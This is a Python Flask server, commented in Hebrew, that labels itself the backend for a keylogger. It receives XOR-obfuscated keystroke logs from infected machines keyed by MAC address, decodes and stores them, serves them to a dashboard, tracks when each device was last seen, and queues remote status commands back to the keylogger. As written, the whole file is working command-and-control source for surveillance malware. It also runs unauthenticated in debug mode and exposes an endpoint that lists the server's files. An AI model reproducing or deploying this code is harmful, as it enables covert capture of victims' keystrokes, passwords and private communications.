from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os
from datetime import datetime
import pytz

app = Flask(__name__)
CORS(app)

REQUIRED_FILES = {
    "device_status.json": [],
    "change_device_status.json": {},
    "all_devices_data.json": []  # שינוי לרשימה כמו בסטטוס
}

def ensure_files_exist():
    for file_name, default_data in REQUIRED_FILES.items():
        if not os.path.exists(file_name):
            try:
                with open(file_name, "w", encoding="utf-8") as f:
                    json.dump(default_data, f, ensure_ascii=False, indent=4)
                print(f"✅ נוצר קובץ ברירת מחדל: {file_name}")
            except Exception as e:
                print(f"❌ שגיאה ביצירת קובץ {file_name}: {e}")

def write_to_device_status(data):
    try:
        file_path = "device_status.json"
        mac_address = data.get("mac_address")
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as file:
                try:
                    data_json = json.load(file)
                    if not isinstance(data_json, list):
                        data_json = []
                except json.JSONDecodeError:
                    data_json = []
        else:
            data_json = []
        israel_tz = pytz.timezone('Asia/Jerusalem')
        data["lastSeen"] = datetime.now(israel_tz).strftime("%d/%m/%Y %H:%M")
        device_index = next((i for i, item in enumerate(data_json) if item.get("mac_address") == mac_address), -1)
        if device_index >= 0:
            data_json[device_index].update(data)
        else:
            data_json.append(data)
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(data_json, f, ensure_ascii=False, indent=4)
        print(f"✅ עדכון סטטוס נכתב ל-{file_path}")
    except Exception as e:
        print("❌ שגיאה בכתיבת device_status.json:", e)

def write_to_device_data(data):
    try:
        file_path = "all_devices_data.json"
        mac_address = next(iter(data.keys()))
        print(f"🔍 נתונים לפני פענוח: {data}")
        data_decrypted = xor_decrypt_dict_list(data)
        print(f"🔍 נתונים אחרי פענוח: {data_decrypted}")
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as file:
                try:
                    data_json = json.load(file)
                    if not isinstance(data_json, list):
                        data_json = []
                except json.JSONDecodeError:
                    data_json = []
        else:
            data_json = []
        # הוספת הנתונים כרשומה חדשה עם ה-MAC והלוגים המפוענחים
        data_to_save = {"mac_address": mac_address, "logs": data_decrypted[mac_address]}
        data_json.append(data_to_save)
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(data_json, f, ensure_ascii=False, indent=4)
        print(f"✅ נתונים נכתבו ל-{file_path} עבור MAC: {mac_address}")
    except Exception as e:
        print("❌ שגיאה בכתיבת all_devices_data.json:", e)

def xor_encrypt_decrypt(text):
    return ''.join(chr(ord(char) ^ 5) for char in text)

def xor_decrypt_dict_list(data):
    processed_dict = {}
    mac_address, timestamps_data = next(iter(data.items()))
    processed_timestamps_data = {}
    for timestamp_key, dictionary_list in timestamps_data.items():
        processed_list = []
        for dictionary in dictionary_list:
            processed_dict_entry = {}
            for k, v in dictionary.items():
                if isinstance(k, str) and isinstance(v, str):
                    decrypted_key = xor_encrypt_decrypt(k)
                    decrypted_value = xor_encrypt_decrypt(v)
                    processed_dict_entry[decrypted_key] = decrypted_value
                else:
                    processed_dict_entry[k] = v
            processed_list.append(processed_dict_entry)
        processed_timestamps_data[timestamp_key] = processed_list
    processed_dict[mac_address] = processed_timestamps_data
    return processed_dict

def write_to_change_status(data):
    try:
        file_path = "change_device_status.json"
        mac_address = data.get("mac_address")
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as file:
                try:
                    status_json = json.load(file)
                    if not isinstance(status_json, dict):
                        status_json = {}
                except json.JSONDecodeError:
                    status_json = {}
        else:
            status_json = {}
        status_json[mac_address] = data
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(status_json, f, ensure_ascii=False, indent=4)
        print(f"✅ שינויי סטטוס נכתבו ל-{file_path}")
    except Exception as e:
        print("❌ שגיאה בכתיבת change_device_status.json:", e)

@app.route('/api/status/update', methods=['POST'])
def status_update():
    print("📡 התחלת טיפול בבקשת עדכון סטטוס מהקיי-לוגר")
    try:
        data = request.get_json()
        if not data or "mac_address" not in data:
            return jsonify({"error": "Invalid JSON or missing mac_address"}), 400
        write_to_device_status(data)
        print("✅ נתוני סטטוס מהקיי-לוגר התקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה בעדכון סטטוס מהקיי-לוגר:", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/data/upload', methods=['POST'])
def upload_data():
    print("📡 התחלת טיפול בבקשת העלאת נתוני מחשב מהאתר")
    mac_address = request.headers.get("mac-address")
    if not mac_address:
        return jsonify({"error": "Missing mac_address in headers"}), 400
    data = {mac_address: request.get_json()}
    print("🔍 נתונים שהתקבלו מהלקוח:", data)
    try:
        if not data or not data[mac_address]:
            return jsonify({"error": "Invalid JSON or missing data"}), 400
        write_to_device_data(data)
        print("✅ נתוני מחשב מהאתר התקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה בעדכון נתוני מחשב מהאתר:", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/data/files', methods=['GET'])
def get_device_logs():
    print("📡 התחלת טיפול בבקשת האזנות עבור מכשיר")
    mac_address = request.headers.get("mac-address")
    if not mac_address:
        return jsonify({"error": "Missing mac_address in headers"}), 400
    try:
        file_path = "all_devices_data.json"
        print(f"🔍 MAC שנשלח בבקשה: {mac_address}")
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as file:
                data_json = json.load(file)
                if not isinstance(data_json, list):
                    data_json = []
            print(f"📜 תוכן הקובץ {file_path}: {data_json}")
            # התעלמות מרגישות לאותיות
            device_logs = [entry["logs"] for entry in data_json if entry.get("mac_address", "").lower() == mac_address.lower()]
            if not device_logs:
                print(f"⚠️ לא נמצאו לוגים עבור {mac_address}, בדוק את ה-MAC או את התוכן")
            print(f"✅ לוגים שנשלחו עבור {mac_address}: {device_logs}")
            return jsonify(device_logs)
        print(f"⚠️ הקובץ {file_path} לא נמצא")
        return jsonify([]), 200
    except Exception as e:
        print(f"❌ שגיאה בשליפת לוגים עבור {mac_address}: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/status/all', methods=['GET'])
def get_status_all():
    print("📡 התחלת טיפול בבקשת שליפת סטטוסים לכל המכשירים מהאתר")
    try:
        file_path = "device_status.json"
        with open(file_path, "r", encoding="utf-8") as file:
            data_json = json.load(file)
            if not isinstance(data_json, list):
                data_json = []
            print("✅ סטטוסים שנשלחו אל הדף מהשרת:", data_json)
        return jsonify(data_json)
    except FileNotFoundError:
        print(f"⚠️ הקובץ {file_path} לא נמצא")
        return jsonify([]), 200
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500

@app.route('/api/status/check', methods=['GET'])
def check_status():
    print("📡 התחלת בדיקת סטטוס מהמכשיר לפי MAC (מהקיי-לוגר)")
    mac_address = request.headers.get("mac-address")
    if not mac_address:
        return jsonify({"error": "Missing mac_address in headers"}), 400
    try:
        file_path = "change_device_status.json"
        with open(file_path, "r", encoding="utf-8") as file:
            status_json = json.load(file)
            if not isinstance(status_json, dict):
                status_json = {}
        device_status = status_json.get(mac_address)
        if not device_status:
            return jsonify({"message": "No status found"}), 404
        print("✅ סטטוס אחרון מהקיי-לוגר עבור MAC", mac_address, ":", device_status)
        del status_json[mac_address]
        with open(file_path, "w", encoding="utf-8") as file:
            json.dump(status_json, file, ensure_ascii=False, indent=4)
        return jsonify(device_status)
    except FileNotFoundError:
        print(f"⚠️ הקובץ {file_path} לא נמצא")
        return jsonify({"error": "Status file not found"}), 500
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500
    except Exception as e:
        print("❌ שגיאה בטיפול בבקשת /api/status/check:", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/status/change', methods=['POST'])
def change_status():
    print("📡 התחלת טיפול בבקשת שינוי סטטוס מהאתר")
    try:
        data = request.get_json()
        if not data or "mac_address" not in data:
            return jsonify({"error": "Invalid JSON or missing mac_address"}), 400
        write_to_change_status(data)
        print("✅ נתוני סטטוס מהאתר התקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה בעדכון סטטוס מהאתר:", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/files/list', methods=['GET'])
def list_files():
    try:
        current_dir = os.getcwd()
        all_items = os.listdir(current_dir)
        files_info = []
        for item in all_items:
            item_path = os.path.join(current_dir, item)
            if os.path.isfile(item_path):
                file_size = os.path.getsize(item_path)
                files_info.append({
                    "name": item,
                    "size_bytes": file_size
                })
        print(f"📂 קבצים בספרייה הנוכחית ({current_dir}):")
        for file in files_info:
            print(f"  - {file['name']}: {file['size_bytes']} בייטים")
        return jsonify({
            "files": files_info,
            "total_files": len(files_info)
        }), 200
    except Exception as e:
        print(f"❌ שגיאה ברשימת הקבצים: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    ensure_files_exist()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
